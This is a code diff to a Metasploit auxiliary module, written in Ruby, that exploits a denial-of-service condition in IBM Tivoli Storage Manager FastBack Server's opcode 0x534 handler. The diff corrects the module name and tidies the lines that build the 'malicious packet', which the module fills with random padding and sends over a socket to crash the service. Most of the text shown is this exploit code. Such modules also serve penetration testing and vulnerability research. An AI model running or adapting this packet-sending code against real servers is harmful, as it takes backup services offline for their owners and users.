@@ -12,7 +12,7 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "  Server Opcode 0x534 Denial of Service",
+      'Name'           => "IBM Tivoli Storage Manager FastBack Server Opcode 0x534 Denial of Service",
       'Description'    => %q{
           This module exploits a denial of service condition present in IBM Tivoli Storage Manager
           FastBack Server when dealing with packets triggering the opcode 0x534 handler.
@@ -66,9 +66,9 @@ class Metasploit4 < Msf::Auxiliary
     print_status("Sending malicious packet")
 
     p = tv_pkt(target_opcode,
-               p1 = "File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % [Rex::Text.rand_text_alpha(0x200),0,0,0,0],
-               p2 = Rex::Text.rand_text_alpha(0x60),
-               p3 = Rex::Text.rand_text_alpha(0x60)
+               "File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % [Rex::Text.rand_text_alpha(0x200),0,0,0,0],
+               Rex::Text.rand_text_alpha(0x60),
+               Rex::Text.rand_text_alpha(0x60)
               )
 
     sock.put(p)
